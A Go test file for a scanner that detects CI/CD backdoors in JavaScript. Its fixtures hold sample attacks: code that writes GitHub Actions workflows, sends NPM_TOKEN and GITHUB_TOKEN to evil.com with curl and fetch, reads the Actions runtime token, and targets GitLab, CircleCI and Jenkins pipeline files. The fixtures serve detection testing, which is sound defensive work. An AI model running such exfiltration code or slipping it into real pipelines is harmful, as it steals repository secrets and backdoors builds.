package analyzer

import (
	"strings"
	"testing"
)

func TestCIBackdoor_WorkflowCreation(t *testing.T) {
	a := NewCIBackdoorAnalyzer()
	content := `
const fs = require('fs');
const path = require('path');
const workflowDir = '.github/workflows/';
fs.mkdirSync(workflowDir, { recursive: true });
fs.writeFileSync(path.join(workflowDir, 'update.yml'), workflowContent);
`
	findings := a.scanContent(content, "inject.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "GitHub Actions workflow") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect GitHub Actions workflow manipulation")
	}
}

func TestCIBackdoor_SecretsExfiltration(t *testing.T) {
	a := NewCIBackdoorAnalyzer()
	content := `
const workflow = "name: Update\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -X POST https://evil.com -d \"${{ secrets.NPM_TOKEN }}\"";
fs.writeFileSync('.github/workflows/ci.yml', workflow);
`
	findings := a.scanContent(content, "backdoor.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "secrets") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect GitHub Actions secrets reference")
	}
}

func TestCIBackdoor_ActionsRuntimeToken(t *testing.T) {
	a := NewCIBackdoorAnalyzer()
	content := `
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
fetch(url, { headers: { Authorization: 'Bearer ' + token } });
`
	findings := a.scanContent(content, "runtime.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "runtime token") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect GitHub Actions runtime token access")
	}
}

func TestCIBackdoor_GitHubTokenExfiltration(t *testing.T) {
	a := NewCIBackdoorAnalyzer()
	content := `
const ghToken = process.env.GITHUB_TOKEN;
fetch('https://evil.com/collect', {
  method: 'POST',
  body: JSON.stringify({ token: ghToken })
});
`
	findings := a.scanContent(content, "token.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "GITHUB_TOKEN") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect GITHUB_TOKEN exfiltration")
	}
}

func TestCIBackdoor_MultiProviderPipelines(t *testing.T) {
	a := NewCIBackdoorAnalyzer()
	content := `
const ciFiles = ['.gitlab-ci.yml', '.circleci/config.yml', 'Jenkinsfile'];
for (const file of ciFiles) {
  if (fs.existsSync(file)) {
    const content = fs.readFileSync(file, 'utf8');
    // Inject backdoor step
  }
}
`
	findings := a.scanContent(content, "multi_ci.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "CI/CD pipeline file") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect multi-provider CI/CD pipeline targeting")
	}
}

func TestCIBackdoor_CleanCode(t *testing.T) {
	a := NewCIBackdoorAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/api/status', (req, res) => res.json({ healthy: true }));
app.listen(3000);
`
	findings := a.scanContent(content, "server.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
